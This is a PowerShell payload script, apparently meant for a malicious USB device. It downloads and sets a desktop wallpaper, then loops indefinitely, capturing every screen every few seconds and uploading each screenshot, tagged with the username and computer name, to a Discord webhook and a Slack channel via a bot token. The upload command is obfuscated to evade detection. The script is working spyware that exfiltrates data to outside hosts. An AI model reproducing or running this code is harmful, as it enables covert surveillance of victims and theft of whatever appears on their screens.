$dwbt='https://discord.com/api/webhooks/AAA' + 'AAA' + 'AAA'
$swbt='https://hooks.slack.com/services/AAA' + 'AAA'
$sat = "xoxb-AAA" + "AAA"

$p=$home + '\AppData\Local\Temp' + '\b.jpg';
iwr https://raw.githubusercontent.com/WesleyWong420/OPSEC-Tradecraft/refs/heads/main/O.MG%20Payloads/Wallpaper.png -O $p;
SP 'HKCU:Control Panel\Desktop' WallPaper $p;
1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}

while(1){
  Add-Type -AssemblyName System.Windows.Forms,System.Drawing

  $screens = [System.Windows.Forms.Screen]::AllScreens

  $left = [int]::MaxValue
  $top = [int]::MaxValue
  $right = [int]::MinValue
  $bottom = [int]::MinValue

  foreach ($screen in $screens) {
      $left = [Math]::Min($left, $screen.Bounds.Left)
      $top = [Math]::Min($top, $screen.Bounds.Top)
      $right = [Math]::Max($right, $screen.Bounds.Right)
      $bottom = [Math]::Max($bottom, $screen.Bounds.Bottom)
  }

  $width = $right - $left
  $height = $bottom - $top

  $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
  $bmp = New-Object -TypeName System.Drawing.Bitmap -ArgumentList $width, $height
  $graphics = [System.Drawing.Graphics]::FromImage($bmp)

  $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\crab.png")
  $graphics.Dispose()
  $bmp.Dispose()

  Start-Sleep -Seconds 5

  try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\crab.png' } catch {}
  if (Test-Path $ffp) {
      $uu = $env:USERNAME
      $cc = $env:computername
      $tml = (Get-Date -Format HHmmss)
      try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
      $bd = [System.Guid]::NewGuid().ToString()
      $lf = "`r`n"
      $pt1 = @{
          "username" = $uu
          "content"  = "`**Screenshot Captured For $cc At $tml`**"
      } | ConvertTo-Json -Compress
      $q1t = (
          "--$bd",
          "Content-Disposition: form-data; name=`"payload_json`"",
          "Content-Type: application/json",
          "",
          $pt1,
          "--$bd",
          "Content-Disposition: form-data; name=`"file`"; filename=`"Capture.png`"",
          "Content-Type: application/octet-stream",
          "",
          [System.Text.Encoding]::UTF8.GetString($fb),
          "--$bd--"
      ) -join $lf
      $hh = @{
          "Content-Type" = "multipart/form-data; boundary=$bd"
      }
      i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null
  
      $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
      $sh = @{
          "Authorization" = "Bearer $sat"
          "Content-Type"  = "application/x-www-form-urlencoded"
      }
      $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
      if ($luur.upload_url) {
          $suh = @{
              "Content-Type" = "application/octet-stream"
          }
          i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
          $scu = "https://slack.com/api/files.completeUploadExternal"
          $scb = @{
              "files" = @(@{ "id" = $luur.file_id; "title" = "Capture.png" })
              "channel_id" = "C08F8RJ84P5"
              "initial_comment"  = "`*Screenshot Captured For $cc At $tml`*"
          } | ConvertTo-Json -Compress
          $sh = @{
              "Authorization" = "Bearer $sat"
              "Content-Type"  = "application/json"
          }
          i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
      }
  }
}
